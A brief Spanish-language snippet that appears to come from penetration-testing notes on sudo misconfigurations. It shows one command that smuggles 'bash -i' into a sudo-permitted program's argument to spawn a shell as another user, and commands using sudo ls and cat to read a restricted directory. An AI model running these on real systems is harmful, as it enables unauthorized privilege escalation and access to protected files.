```bash
sudo -u USER RUTA ‘-la; bash -i’
```

## Ver contenido de directorio restringido

```bash
sudo -u USER /usr/bin/ls /Directorio_restringido

sudo -u USER /usr/bin/cat /Directorio_restringido
```
